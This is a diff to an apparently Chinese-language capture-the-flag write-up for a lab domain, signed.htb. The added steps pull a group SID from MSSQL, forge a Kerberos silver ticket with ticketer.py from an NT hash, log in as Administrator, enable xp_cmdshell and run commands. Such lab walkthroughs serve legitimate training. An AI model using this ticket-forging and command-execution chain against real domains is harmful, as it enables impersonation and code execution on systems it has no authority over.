@@ -216,6 +216,32 @@ Type "help", "copyright", "credits" or "license" for more information.
 'S-1-5-21-4088429403-1159899800-2753317549-513'
 >>> exit()
 ```
+##### 从数据库中获取令一个 SID       
+```
+SQL (SIGNED\Administrator  guest@master)> select SUSER_SID('Signed\IT')                                                             
+-----------------------------------------------------------   
+b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'   
+```
+##### 把二进制 SID 转换成标准格式 
+```
+[★]$ python3 -c 'print(0x451)'
+1105
+
+# hex → decimal
+python3 -c 'print(0x451)'
+
+# decimal → hex
+python3 -c 'print(hex(1105))'
+```
+##### 制作票据和登录
+```
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
+[★]$ KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k DC01.signed.htb
+
+SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
+
+SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell whoami
+```
 ##### 高完整性（High Integrity）服务上下文|但是OPENROWSET使用BULK关键字可以读取使用这些组的文件 
 ```
 SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "whoami /groups" 
